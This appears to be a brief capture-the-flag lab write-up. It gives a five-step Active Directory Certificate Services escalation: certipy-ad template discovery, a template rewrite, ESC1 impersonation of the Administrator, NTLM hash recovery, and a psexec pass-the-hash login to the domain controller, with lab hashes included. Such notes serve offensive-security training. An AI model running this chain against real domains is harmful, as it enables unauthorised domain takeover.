
Certificate Priv Esc which modifies an Certificate Template. Which we can then use to exploit it to elevate privs.

1. This checks which cert is vulnerable (since there is many)

```
certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vuln
```

2. Comprimise the certificate template, which allows us to perform an ESC1 Attack after.

```
certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
```

3. Perform ESC1 Attack.

This command requests a certificate file "administrator.pfx" for the user Administrator by using ca_svc credentials to impersonate that user's UPN with the "DunderMifflinAuthentication" template.
```
certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -target dc01.sequel.htb -target-ip 10.129.232.128
```

4. Get NTLM Hash of Administrator User

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.128
```

5. Logged into the DC

```
impacket-psexec Administrator@sequel.htb -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```